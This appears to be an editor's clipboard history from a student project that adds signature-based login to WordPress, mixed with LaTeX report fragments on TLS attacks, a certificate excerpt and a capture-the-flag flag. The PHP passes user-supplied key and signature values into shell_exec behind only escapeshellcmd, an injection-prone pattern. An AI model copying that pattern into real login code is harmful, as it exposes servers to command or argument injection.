				 * Filters whether the plaintext password matches the encrypted password.
				 *
				 * @since 2.5.0
				 *
				 * @param bool       $check    Whether the passwords match.
				 * @param string     $password The plaintext password.
				 * @param string     $hash     The hashed password.
				 * @param string|int $user_id  User ID. Can be empty.
				 */
				return apply_filters( 'check_password', $check, $public_key, $stored, $user_id );
			}
	
			// If the stored hash is longer than an MD5, presume the
			// new style phpass portable hash.
			if ( empty( $wp_hasher ) ) {
				require_once( ABSPATH . WPINC . '/class-phpass.php' );
				// By default, use the portable hash from phpass
				$wp_hasher = new PasswordHash( 8, true );
			}
	
			$check = $wp_hasher->CheckPassword( $public_key, $stored );
	
0dc5aa5a91bfcd707458dba92cf1366d|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2327|1|V|php
	
			/** This filter is documented in wp-includes/pluggable.php */
1beb84dd7a7e9427baae4aa8ca9fa646|file:///home/neo/Documents/diplomatiki/auth-webapp/auth.js|128|28|V|javascript
	    console.log(public_key);
	    console.log(signature);
44dc956f06c2ed6781abc7914a6fef57|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/verify.py|15|1|V|python
	# public_key_str = raw_input("Public key: ")
	# message_str = raw_input("Message: ")
	# signature_str = raw_input("Signature: ")
6cc04f46d184afca014f203e6eed5f0b|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/verify.py|25|12|v|python
	Signature is correct!
efab931aa65e123ed37d4915aaa60b63|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/verify.py|28|12|v|python
	Signature is bad!
eff3048ca9b204dcdec128280a1d55f0|file:///home/neo/Documents/diplomatiki/auth-webapp/index.php|77|1|V|php
	                $command = escapeshellcmd("/usr/bin/python2.7 /opt/lampp/htdocs/verify.py $public_key $message $signature");
6de512be5e1433af497a87459e3f0c48|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2329|9|v|php
	ctheck 
f48318cdd3fd5e0d2417fd9355abd4ac|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2328|8|V|php
	        $command = escapeshellcmd("/usr/bin/python2.7 /opt/lampp/htdocs/verify.py $public_key $message $signature");
4be2ea29b3288958e0ec683f0509afc5|file:///home/neo/Documents/diplomatiki/auth-webapp/index.php|78|1|V|php
	                $output = shell_exec($command);
8404dff87117eb65e316a6aa7a6171dd|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2336|9|V|php
	         
e1b6cafed4061a3558ec198df9912375|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2336|9|V|php
	        } else{
e4afe26b5b57083f74b2d01c7066379c|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2326|30|v|php
	public_key
f865d485bb7307c221a3b85523713694|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2329|55|v|php
	/opt/lampp/htdocs/
01cbc88c45018707d54d161ecf6cb625|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2329|36|v|php
	/usr/bin/python2.7
dba6a21944680401c4ac3298f7db33bd|list:/extensions|14|1|V|list
	* coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	* coc-snippets	2.1.19	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-python	1.2.9	~/.config/coc/extensions/node_modules/coc-python
7f628ae8f8542404b2d663bd395a787c|list:/extensions|4|1|V|list
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-snippets	2.1.19	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-python	1.2.9	~/.config/coc/extensions/node_modules/coc-python
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
2d28adda11570c59b9753aa853e058f3|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/auth.js|133|1|V|javascript
	  let postResult = Promise.resolve(
	    $.post(server, postData, function(data) {
	      console.log(data);
	    })
	  );
	  return postResult;
a3fb9bc2504a75a60105fb1714ee98db|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/auth.js|129|1|V|javascript
	    postData.public_key = public_key;
	    postData.signature = signature;
55220aa2a1221ee3ffee3eba7ae13f9f|file:///home/neo/Documents/diplomatiki/auth-webapp/myjs.js|11|7|v|javascript
	console.log(signature);
ac201fd270c3b96beab24f2829780ab2|file:///home/neo/Documents/diplomatiki/auth-webapp/myjs.js|12|21|v|javascript
	signature
a7556b96e4453a6f4736131107154b20|file:///home/neo/Documents/diplomatiki/auth-webapp/sig.txt|1|1|V|text
	5ae45763dbf276607e4c07716defb9860272ff14d60248a7d1d59f96fca06b2f603121fd42d22f3005e676ceef235b8edb0a34ad6522541d31df4a83f951fe01
329f7f52235704fcc52aa0af8104a0ac|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2327|1|V|php
	        $message = "af82";
	        /* if (hash_equals($public_key, $stored) == true){ */
	        $command = escapeshellcmd("python /var/www/html/verify.py $stored_pk $message $signature");
	        $output = shell_exec($command);
	        if ($output === "1"){
	            $check = true;
	        } else {
	            $check = false;
	        }
	        /* } else{ */
	        /*     $check = false; */
	        /* } */ 
7de54aed01ec48f5f3f789de9dc9a355|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1471|1|V|php
			<script type="text/javascript">
				<?php echo $login_script; ?>
			</script>
e0e5aad22588b2cd31c2e796cff508d8|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1438|3|V|php
				<?php echo $login_script; ?>
899c4703cd038c65f88fe62b02661150|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1476|4|v|php
	<?php echo $login_script; ?>
d6cba1ad2c0b131207c9dc2584126130|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1476|8|v|php
	form_id
008cb397c44c63c0fc98d335e388f314|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1479|17|V|php
	                $("#change_value").val("deneme");//change input
25891811dad0963ff1418d10d173c1c3|file:///home/neo/Documents/diplomatiki/auth-webapp/myjs.js|10|1|V|javascript
	      let signature = authenticate(username, password, "http://localhost:80/index.php", "af82");
	      signature.then( (sig) => {
	        console.log(sig);
	      })
	      return false;
	    });
	  });
	  $("#register-form").submit(function() {
	    let password = document.getElementById("passwd-rgst").value;
	    let username = document.getElementById("username-rgst").value;
	    register(username, password, "http://localhost:80/index.php");
	    return false;
	  });
	});
4e1d47ff2f674ed2b28a2b7608618451|file:///home/neo/Documents/diplomatiki/auth-webapp/myjs.js|10|1|V|javascript
	      let signature = authenticate(username, password, "http://localhost:80/index.php", "af82");
	      signature.then( (sig) => {
	        console.log(sig);
	      })
669cef6bdde5075be4bcaf92c357831c|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1479|19|V|php
	                let signature = 
	                  let signature = authenticate(username, password, "http://localhost:80/index.php", "af82");
34a004a98a68d21c29aea4ad72c52e5d|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1479|17|V|php
	                let signature = 
a9473ded85aa51851deb4859cdd53f98|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1480|16|V|php
	                
e66e1147944533ba7de54439a323dba1|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1483|17|V|php
	                $("#change_value").val("deneme");//change input
	                $("#form_id").off("submit");//need form submit event off.
	                self.submit();//submit form
5b3dcf48096a586bedab328dd51cddde|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1483|65|v|php
	 "http://localhost:80/index.php",
985601f631878e469dbe9ef2f64d61d0|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1486|25|v|php
	change_value
bd48c0054df18c85d4b44a4ac15414d2|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1486|41|v|php
	"deneme"
8bf4f0cf9276713eb4855089228ce459|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1476|1|V|php
				$("#loginform").on("submit", function (e) {
	                e.preventDefault();//stop submit event
	                let self = $(this);//this form
	                initializeCredentialType({
	                 passwordMinLength: 4,
	                 passwordProccessMethod: "plain",
	                });
	                let signature = authenticate(username, password, "af82");
	                signature.then( (sig) => {
	                    console.log(sig);
	                    $("#user_pass").val(sig);//change input
	                    $("#form_id").off("submit");//need form submit event off.
	                    self.submit();//submit form
	                })
	            });
d45c91e736058577d237dfbed050c01d|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1475|3|V|php
			<script type="text/javascript">
			</script>
f2f8663020b0f106f61cee0de1d4f875|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|112|1|V|php
		add_action( 'login_enqueue_scripts', 'enqueue_my_script' );
	
		function enqueue_my_script( $page ) {
			    wp_enqueue_script( 'auth', 'http://10.16.20.23/auth.js', null, null, true );
		}
		do_action( 'login_enqueue_scripts' );
377ef9ad7827329fb571aa8fdf6dd2b6|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|116|13|V|php
	            wp_enqueue_script ()
f76bfe081457c2f2c1d0e808e3964666|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|115|1|V|php
			    wp_enqueue_script( 'auth', 'http://10.16.20.23/auth.js', null, null, true );
928fe6aa36faedb51066041b30caa44a|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|115|47|v|php
	'http:
615446a984ba338d1ccae39c4a564317|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|115|47|v|php
	/10.16.20.23
a7304c057bbcac903e03e8ae23bd162a|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|116|41|v|php
	'http://10.16.20.23/
9bcd03286c65aed0d62f796158eb1367|file:///home/neo/Documents/diplomatiki/auth-webapp/form.html|7|14|v|html
	https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js
a6ebb3dbc63ea2596c8abfb9eab1a242|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|115|13|V|php
	            wp_enqueue_script('jquery');
20911240c190fad3279eb610703a5cfd|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|2|1|v|javascript
	$("#
440c2aa0e1c64831de39c7ce94801f3e|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|113|25|V|javascript
	  postData.username = username;
	  postData.mode = "login";
6d531390693a76ac4203b105ad544aa3|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|112|3|V|javascript
	  let postData = {};
bac06b441fb471443b4c068b2e4673a1|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|114|5|v|javascript
	postData.password = password;
a116481cc69997b2ae3260b947f97e58|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|111|29|v|javascript
	username,
f42b957cc66c2f4dae15907d93770127|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|126|5|V|javascript
	    return Promise.resolve(signature);
b9489558c251133031ef74c8d3a63441|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|10|34|v|javascript
	jQuery("user_pass")
592b8d242190321c78e7f5e77fafdcc2|file:///home/neo/Documents/diplomatiki/auth-webapp/myjs.js|10|46|v|javascript
	"http://localhost:80/index.php",
15072486fa6adf68deeb146f0cee16a7|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|18|1|v|javascript
	jQuery("#loginform").on("submit", function (e) {
ec998c39cd4e72f091b7d45717c504a3|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|18|1|V|javascript
	j
	    e.preventDefault();//stop submit event
	    let self = jQuery(this);//this form
	    let password = jQuery("user_pass");
	    initializeCredentialType({
	     passwordMinLength: 4,
	     passwordProccessMethod: "plain",
	    });
	    let signature = authenticate(password, "af82");
	    signature.then( (sig) => {
	        console.log(sig);
	        jQuery("#user_pass").val(sig);//change input
	        jQuery("#loginform").off("submit");//need form submit event off.
	        self.submit();//submit form
	    })
	});
4494cf7130c9d655d7dd4b20d0ff65f8|file:///etc/openvpn/client.crt|79|52|v|
	NwslgZauyeGxW
	w8V9JKccejuP8ebr836hWos02+kpwS/dwIMzEhClKjjYB/Bpw5c6xFrrlJKi7tO/
	EyCx6woZQ+dT5QVNJeU46mHc6VpPjRqeWxY9oAIO+Mykggbi8tjNkYQCw3q/AgMB
	AAGjggFxMIIBbTAJBgNVHRMEAjAAMC0GCWCGSAGG+EIBDQQgFh5FYXN5LVJTQSBH
	ZW5lcmF0ZWQgQ2VydGlmaWNhdGUwHQYDVR0OBBYEFEyPK62uXJMoOHKMIYS9Zlyl
	CNieMIHvBgNVHSMEgecwgeSAFKFP/rs/o3ewg9Lw67CVkVGj+KwOoYHApIG9MIG6
	MQswCQYDVQQGEwJDWTEQMA4GA1UECBMHTmljb3NpYTEQMA4GA1UEBxMHTmljb3Np
	YTEdMBsGA1UEChMUVW5pdmVyc2l0eS1vZi1DeXBydXMxGDAWBgNVBAsTD0NvbXB1
	dGVyU2NpZW5jZTEcMBoGA1UEAxMTdGhlbWlzLmNzLnVjeS5hYy5jeTEPMA0GA1UE
	KRMGc2VydmVyMR8wHQYJKoZIhvcNAQkBFhBhbmtAY3MudWN5LmFjLmN5ggkApht7
	k643CYgwEwYDVR0lBAwwCgYIKwYBBQUHAwIwCwYDVR0PBAQDAgeAMA0GCSqGSIb3
	DQEBCwUAA4IBAQAE7psyJ3AHwwOlzlLfDrUT+Sdwa/3XB1AJAjf9ZpdEJJbvhfSY
	BHTvzXXwU/myF785b9tkQVwmU9TKH44pAMz1yNpaDMldphpb7TQczpXWS6hiExOb
	Fh0xj5zYrPdCldu9G44bQ7+6+GH7CZZOdqxREweIruRld1hyUVT9ojEpm4FLozXT
	rKKIyBzWygrRZODVbS2F6VCWxlxRlC4XI4MDU5cgFTIhHXnoodL0oXG86+yvioNP
	os6Zk1eo6c2JVvgXAzBn/U081SO/FKSp5/pdbiL377sXt2t5y5Bf882xQpdHyUUk
	KSWD2vwLN4QZWHOxUkjJYiFzmlMLS8YOEfaf
a4a62b07e4abf6782c125078de2a0595|list:/extensions|3|1|V|list
	* coc-snippets	2.1.19	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-python	1.2.9	~/.config/coc/extensions/node_modules/coc-python
206bb2835a651d831f84383aba4beca7|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|2|1|V|tex
	\documentclass[a4paper]{llncs}
	
	\usepackage{graphicx}
	\usepackage{listings}
	\usepackage{color}
5989288bb098aa7af8e149d2c4e33d44|file:///home/neo/Documents/epl682/report/report.tex|1|1|V|tex
	\documentclass{article}
	i
	i
066c51d61d79ff0bcccba741c300e971|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|2|1|V|tex
	\documentclass[a4paper]{llncs}
a1719430448bd361d41ff46a3cdc4287|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|2|1|V|tex
	\documentclass[a4paper]{llncs}
	
d7a50e09c593cc051f7e43c7665f212e|file:///home/neo/Documents/epl682/report/report.tex|4|1|V|tex
	\title{TLS Security}
3fcdbf07b2c228028d67c10055a159dc|file:///home/neo/Documents/epl682/report/report.tex|1|1|V|tex
	\documentclass{article}
699698af83b2eed58a3d4451a0918705|file:///home/neo/Documents/epl682/report/report.tex|4|1|V|tex
	\usepackage{listings}
16f723ed5c450da3ed886b614a49f69d|file:///home/neo/Documents/epl682/report/report.tex|1|25|v|tex
	llncs
da07eee64067edaf847c860484cad767|file:///home/neo/Documents/epl682/report/report.tex|14|32|V|tex
	\section*{Paper: On the Security of RC4 in TLS}
	
1e7cea27029b43d508e1d1d2b5b36a02|file:///home/neo/Documents/epl682/report/report.tex|17|1|V|tex
	\begin{}
6a0d9eaee314c567fd72fb97ee707a36|file:///home/neo/Documents/epl682/report/report.tex|16|152|v|tex
	Record
178650ca524aadd49f18c50aed517cac|file:///home/neo/Documents/epl682/report/report.tex|15|1|V|tex
	\subsection*{What is it?}
3f66a45bb157adc4a29f6b2c01f94999|file:///home/neo/Documents/epl682/report/report.tex|20|1|V|tex
	\subsection*{The RC4 algorithm}
f1a586cf2e595ee8eef5764381f716ad|file:///home/neo/Documents/epl682/report/report.tex|20|14|v|tex
	The RC4 algorithm
497c27f0c8b031e95be23ed08692234b|file:///home/neo/Documents/epl682/report/report.tex|27|1|v|tex
	\section*{Paper: \textit Using Frankencerts for Automated Adversarial Testing of Certificate Validation in SSL/TLS Implementations}
497c27f0c8b031e95be23ed08692234b|file:///home/neo/Documents/epl682/report/report.tex|27|1|v|tex
	\section*{Paper: \textit Using Frankencerts for Automated Adversarial Testing of Certificate Validation in SSL/TLS Implementations}
3f05d6f38862a5b18b2eb4e867a61fb1|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using
3f05d6f38862a5b18b2eb4e867a61fb1|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using
cab53223cc08fbd039b57371e440494e|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using Frankencerts for
cab53223cc08fbd039b57371e440494e|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using Frankencerts for
eaec978a1e237ff805439658fe3bc49a|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using Frankencerts for Automated Adversarial 
eaec978a1e237ff805439658fe3bc49a|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using Frankencerts for Automated Adversarial 
9b59ad88e3963abdef982a30954f1be9|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using Frankencerts for Automated Adversarial Testing of Certificate
9b59ad88e3963abdef982a30954f1be9|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using Frankencerts for Automated Adversarial Testing of Certificate
9d31d1296a3b2ba6f7602eaae405cb15|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using Frankencerts for Automated Adversarial Testing of Certificate Validation in 
9d31d1296a3b2ba6f7602eaae405cb15|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using Frankencerts for Automated Adversarial Testing of Certificate Validation in 
9aea4b98ee089b04a9fbbf84e1077239|file:///home/neo/Documents/epl682/report/report.tex|27|1|v|tex
	Using Frankencerts for Automated Adversarial Testing of Certificate Validation in SSL/TLS Implementations}
	
	\end{document}
9aea4b98ee089b04a9fbbf84e1077239|file:///home/neo/Documents/epl682/report/report.tex|27|1|v|tex
	Using Frankencerts for Automated Adversarial Testing of Certificate Validation in SSL/TLS Implementations}
	
	\end{document}
b753c831893f298806581038b69bf77e|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using Frankencerts for Automated Adversarial Testing of Certificate Validation in SSL/TLS
b753c831893f298806581038b69bf77e|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using Frankencerts for Automated Adversarial Testing of Certificate Validation in SSL/TLS
2ec44d7aa4b64f9404be21c3d761ae01|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using Frankencerts for Automated Adversarial Testing of Certificate Validation in SSL/TLS Implementations
2ec44d7aa4b64f9404be21c3d761ae01|file:///home/neo/Documents/epl682/report/report.tex|27|26|v|tex
	Using Frankencerts for Automated Adversarial Testing of Certificate Validation in SSL/TLS Implementations
4d83e71b02ac599528a5d340ed5baa6f|file:///home/neo/Documents/epl682/report/report.tex|2|1|V|tex
	\begin{su}
220a69cf5ad6a3e2d565b69cb1904fa3|file:///home/neo/Documents/epl682/report/report.tex|27|1|V|tex
	\section*{Paper: \textit{Using Frankencerts for Automated\\ Adversarial Testing of Certificate Validation\\ in SSL/TLS Implementations}}
07a163a76de2fffd3088a70136e965a6|file:///home/neo/Documents/epl682/report/report.tex|24|1|V|tex
	\subsection*{The problem }
e7813fe0ff5d339380cdf2f338cfa11f|file:///home/neo/Documents/epl682/report/report.tex|32|26|v|tex
	ertificate Authorities
8a26bcbbc512d1a7a3f893b17d3639ab|file:///home/neo/Documents/epl682/report/report.tex|29|161|v|tex
	various restrictions
cfd86429ee1cd97b91aa553faa65d5a1|file:///home/neo/cyberranges/manifesto.txt|60|1|V|text
	flag{An0n_acc3ss_is_qUiT3_bad}
cefc186844fce20bceea3ca632248dd6|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|13|1|V|tex
	\begin{figure}[]
	  \centering \includegraphics[scale=0.6]{images/auth_overview.pdf}
	  \caption{Overview of the architecture of {\tt auth.js}. The client requests the web application from the server (1). The server responds by sending the html file, which directs the client to retrieve {\tt auth.js} from a trusted third party, as well as with a Javascript file in which the authentication options are initialized (2). The client then retrieves {\tt auth.js} from the trusted source (3 and 4). The client's browser uses the register API call from {\tt auth.js} to generate the correct credential (5) and sends it to the server (6).}
	  \label{fig:architecture}
	\end{figure}
	
8fbd04de5e832abbe9becf0a994890c3|file:///home/neo/Documents/epl682/report/report.tex|88|1|V|tex
	  \caption{Overview of the architecture of {\tt auth.js}. The client requests the web application from the server (1). The server responds by sending the html file, which directs the client to retrieve {\tt auth.js} from a trusted third party, as well as with a Javascript file in which the authentication options are initialized (2). The client then retrieves {\tt auth.js} from the trusted source (3 and 4). The client's browser uses the register API call from {\tt auth.js} to generate the correct credential (5) and sends it to the server (6).}
361336b01b5ee38f8ebb0ae8f16942a3|file:///home/neo/Documents/epl682/report/report.tex|87|49|v|tex
	auth_overview.pdf
efe79c321127e9bcc1ad7f6956d52ca6|file:///home/neo/Documents/epl682/report/report.tex|88|14|v|tex
	architecture
40fa7061be188492e3fd86ba145ea7c5|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|4|1|V|tex
	\usepackage{graphicx}
4ffa0a4cb0db482ccd1a2d352354f289|file:///home/neo/Documents/epl682/report/report.tex|88|42|v|tex
	images/
c6fa27d2645803ff2b15c57788c911a6|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|72|25|v|php
	re vlaka
77e9fe0c5fdb7ca4f43f9432ef02a81d|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|72|9|v|php
	Lathos
7a64fe7486f4c5c1d71821abadd6bf13|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|95|34|v|php
	Lathos public key re vlaka 
7144407d43c9c38b689ed913faabb7f0|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|80|1|V|javascript
	  let postData = {};
	  postData.username = username;
	  postData.mode = "register";
b851bff25727c9c7a9fc281ff5cada0c|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|79|33|v|javascript
	, server
80dfe213d3a9936d6f2ebb81080bdd51|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|91|5|v|javascript
	postData.password 
bf8698b7584503467e994fe14795fd21|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|97|5|v|javascript
	postData.public_key 
4cfaea96f99299d50a7e4c35ad2f647a|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|99|1|V|javascript
	
	  let postResult = Promise.resolve(
	    $.post(server, postData, function(data) {
	      console.log(data);
	    })
	  );
52d80a160d92c89f64dcc99f8d96bf4e|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|112|1|V|php
		add_action( 'login_enqueue_scripts', 'enqueue_my_script' );
	
		function enqueue_my_script( $page ) {
			    wp_enqueue_script( 'auth', home_url() . '/wp-includes/js/auth.js', null, null, true );
			    wp_enqueue_script( 'form_submit', home_url() . '/wp-includes/js/form_submit.js', array('jquery'), null, true );
		}
		do_action( 'login_enqueue_scripts' );
9c59685ccf5bfba24a5ca36e083d6d00|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|112|1|V|php
		add_action( 'login_enqueue_scripts', 'enqueue_my_script' );
	
		function enqueue_my_script( $page ) {
			    wp_enqueue_script( 'auth', home_url() . '/wp-includes/js/auth.js', null, null, true );
			    wp_enqueue_script( 'form_submit', home_url() . '/wp-includes/js/form_submit.js', array('jquery'), null, true );
		}
		do_action( 'login_enqueue_scripts' );
	
e43fb5c4848e65a449948785a1a2b4e4|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/class-ur-frontend-form-handler.php|14|47|v|php
	my_script
7383dbfdfebf3622d619ce526b26d4fa|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/class-ur-frontend-form-handler.php|18|73|v|php
	form_submit
5c32dbc028feb879ce2902fcb6d38ef3|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/register.js|2|10|v|javascript
	loginform
8c5cae046e7e97415169631a7ea75d30|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/register.js|11|5|V|javascript
	    public_key.then( (sig) => {
49a365025159ae2c85357b3cc9043c39|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/class-ur-frontend-form-handler.php|14|1|V|php
	add_action( 'login_enqueue_scripts', 'enqueue_register_script' );
	
	function enqueue_register_script( $page ) {
	        wp_enqueue_script( 'auth', home_url() . '/wp-includes/js/auth.js', null, null, true );
	        wp_enqueue_script( 'form_submit', home_url() . '/wp-includes/js/register.js', array('jquery'), null, true );
	}
	do_action( 'login_enqueue_scripts' );
	
1b1bd90107c6572a5738a9e29e493546|file:///home/neo/Documents/epl682/report/report.tex|95|671|v|tex
	the first plaintext byte has the value 100
25672b81ae0489bd2fa6b328254f0fbc|file:///home/neo/Documents/epl682/report/report.tex|95|833|v|tex
	, this means that half of all the ciphertexts will have the byte 100 as their first byte, so we can ded
78e3449fefdb3d7de7e0fb034e5bb702|file:///home/neo/Documents/epl682/report/report.tex|98|82|v|tex
	encrypting
f34b5c20cf48ee884fdcf8ad586b1a70|file:///etc/rkhunter.conf|1189|10|v|conf
	/bin/false
08c9f0f4ca6ca58d4cda3a7a8bc1b109|file:///etc/rkhunter.conf|1352|1|V|conf
	CRON_DAILY_RUN="true"
	CRON_DB_UPDATE="true"
	APT_AUTOGEN="true"
	
	
b50339a10e1de285ac99d4c3990b8693|file:///etc/rkhunter.conf|440|8|v|conf
	NONE
ec3f907072b3aeb09a538df4a268b9d6|untitled:1|3|5|v|
	'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|')
15ba68de3bd13a402747d044a471fe8e|untitled:1|27|1|V|javascript
	}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {}))
609170be45ec0aabe595c93bbf34b9b4|untitled:1|27|3|^v|javascript
